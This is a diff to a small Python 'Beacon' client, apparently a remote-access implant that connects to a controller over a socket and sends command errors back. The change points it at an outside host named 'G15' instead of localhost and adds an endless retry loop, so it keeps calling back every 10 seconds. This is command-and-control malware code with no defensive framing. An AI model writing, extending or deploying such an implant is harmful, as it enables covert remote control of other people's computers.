@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket,subprocess
+import socket,subprocess,time,string
 
 class Beacon:
    #Contains client side behavior and state
@@ -31,8 +31,7 @@ class Beacon:
                      if self.debugging == True:
                         print(error_msg)
                      self.sock.send(error_msg.encode())
-
-
+       
    def start(self):
       self.running = True
       self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -61,7 +60,12 @@ class Beacon:
       self.sock.close()
 
 def main():
-   beacon = Beacon("127.0.0.1",10267)
-   beacon.start()
+   beacon = Beacon("G15",10267)
+   while True:
+      try:
+         beacon.start()
+         break
+      except:
+         time.sleep(10)
 
 main()
